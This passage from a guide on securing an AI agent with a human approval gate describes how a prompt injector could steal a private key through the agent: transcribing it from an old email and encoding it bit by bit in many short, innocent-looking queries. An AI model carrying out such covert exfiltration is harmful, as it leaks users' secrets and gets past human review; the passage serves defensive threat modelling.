of Part 3 does, and it falls back to transcription. Don't read that as
safety: a mailbox is precisely where people paste a private key "just to
have it," so one forgotten five-year-old message puts a whole PEM back
within reach of an agent that can only copy. It costs the attacker a
thread instead of an email.

And the single-query bound above dissolves the same way. A query too short
to hold cover text is only a limit on *one* query. Spread the payload
across many — `define "apple"`, then `define "bridge"`, where the choice of
word carries a few bits each time — and every individual request is short,
query-shaped and utterly innocent. There is no request to refuse. Being
more patient with each one doesn't help; it just approves more of them.
Nor do transcription slips save you: a garbled fragment is simply asked
for again, and the injector is the one checking the work.

So don't offer yourself "it's too big to hide" as comfort, and don't write
it into a threat model. The claim that survives is narrower and genuinely
worth having: **the gate kills *silent* exfil.** Every byte that left was
on a screen in front of you. That's a property of the wiring, which no
amount of attacker cleverness changes — unlike a size limit, which the
attacker simply routes around.

The practical upshot is the discipline Part 2 and `MACHINE.md` already
taught: the break rests on you *reading* what you approve. A rubber-stamped
Send is the same failure as a rubber-stamped delegation or a
rubber-stamped memory edit — which is exactly why the draft is shown to
you in full, and why cutting confirmation fatigue (Part 1) is security
work, not convenience.

## What's next

`MACHINE.md` is memory you can see: every fact lands as a diff you
approve. [Memories](memories.md) builds the opposite kind — mem0,
capturing facts about you automatically, invisibly, across
conversations — and finds that the trick which made this chapter's
full-disk reads safe is the same one that makes *that* safe: an agent
with no way to send bytes out.
